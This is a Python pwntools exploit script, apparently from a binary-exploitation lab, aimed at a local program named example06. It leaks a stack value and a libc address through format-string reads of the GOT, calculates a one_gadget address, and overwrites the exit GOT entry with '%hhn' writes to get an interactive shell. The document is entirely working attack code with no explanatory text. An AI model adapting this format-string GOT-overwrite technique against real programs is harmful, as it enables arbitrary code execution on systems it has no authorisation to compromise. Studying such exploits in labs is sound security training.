from pwn import *

context.terminal = ['tmux', 'splitw', '-h']

p = process('./example06')

gdb.attach(p)
binary = ELF('./example06')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
p.sendline("%7$lx")

p.recvuntil('Hello ')
leak = int(p.recvline()[:8], 16)
print('stackvar', hex(leak))

p.sendline(str(leak))

setvbuf_got = p64(binary.symbols['got.setvbuf'])

payload = b"%9$s    " + setvbuf_got
p.sendline(payload)
leak = p.recvuntil("    ")[:6]
p.recv()

setvbuf_addr = u64(leak.ljust(8, b'\x00'))
print('setvbuf', hex(setvbuf_addr))

one_gadget_offset = 0x10a45c
libc_base = setvbuf_addr - libc.symbols['setvbuf']
onegadget_addr = libc_base + one_gadget_offset

payload = ""
for i in range(6):
    payload += "%" + str(p64(onegadget_addr)[i]) + "c%{}$hhn" + "%" + str(0x100 - p64(onegadget_addr)[i]) + "c"

while len(payload) % 8 != 0:
    payload += 'A'

addresses = b"".join([p64(binary.symbols['got.exit'] + i) for i in range(6)])
start_idx = 8 + len(payload) / 8
full_payload = bytes(payload.format(*[str(int(start_idx + i)) for i in range(6)]), 'utf8') + addresses

print(full_payload)

p.sendline(full_payload)

p.interactive()
